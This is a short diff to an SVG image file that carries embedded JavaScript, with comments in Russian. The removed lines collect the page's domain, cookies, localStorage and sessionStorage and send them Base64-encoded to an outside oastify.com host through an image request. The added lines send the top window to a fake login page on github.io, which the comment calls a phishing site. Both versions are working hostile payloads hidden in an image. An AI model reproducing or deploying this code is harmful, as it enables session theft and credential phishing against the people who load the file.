@@ -1,16 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    // 1. Собираем данные
-    var domain = document.domain; // Где мы находимся?
-    var cookie = document.cookie; // Есть ли куки?
-    var local = JSON.stringify(localStorage); // Весь LocalStorage
-    var session = JSON.stringify(sessionStorage); // Весь SessionStorage
-    
-    // 2. Формируем строку для отправки (Base64 чтобы не сломать URL)
-    var data = btoa("DOMAIN: " + domain + " | LS: " + local + " | COOKIE: " + cookie);
-
-    // 3. Отправляем (используем Image для надежности)
-    var i = new Image();
-    i.src = 'https://ynp430s99pfg88kon73b9vbrsiybm1aq.oastify.com/?leak=' + data;
+    // Мгновенный редирект на твой фишинговый сайт
+    window.top.location.href = "https://nebtyy.github.io/login.html?expired=true";
   </script>
 </svg>
